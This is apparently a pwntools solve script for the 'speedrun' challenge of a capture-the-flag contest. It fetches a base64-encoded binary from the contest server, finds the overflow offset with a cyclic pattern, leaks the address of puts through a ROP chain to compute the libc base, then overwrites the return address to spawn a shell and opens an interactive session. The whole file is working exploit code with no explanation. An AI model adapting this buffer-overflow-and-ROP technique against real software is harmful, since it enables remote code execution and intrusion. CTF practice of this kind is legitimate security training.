#!/usr/bin/env python3

import base64
from pwn import *

#p = process(['python3', './speedrun.py'])
p = remote('chal.imaginaryctf.org', '42020')
p.recvuntil("---------------------------BEGIN  DATA---------------------------")
bin_64 = p.recvuntil("----------------------------END  DATA----------------------------")
p.clean()
bin_64 = bin_64[:-66]
bincode = base64.b64decode(bin_64)
with open('speedrun_bin', 'wb') as f:
    f.write(bincode)
binelf = './speedrun_bin'
elf = ELF(binelf)

# get offset from the binary data
binproc = process(binelf)
binproc.sendline(cyclic(1000))
binproc.wait()
core = binproc.corefile
stack = core.rsp
pattern = core.read(stack,4)
rip_offset = cyclic_find(pattern)

print("offset=>"+str(rip_offset))
padding = b'\x00'*rip_offset

r = ROP(elf)
libc = ELF('./libc6_2.28-10_amd64.so')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
rdi_ret = (r.find_gadget(['pop rdi', 'ret']))[0]
binsh = 0x4484f

payload = padding + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
p.sendline(payload)
p.recvline()
rcv = p.recvline().strip()
puts_addr = u64(rcv.ljust(8,b'\x00'))
print("puts_addr=>"+hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
binsh = libc_base + binsh

payload = padding + p64(binsh)
p.sendline(payload)
print(p.recvline())
print("====SHELL====")
p.interactive()

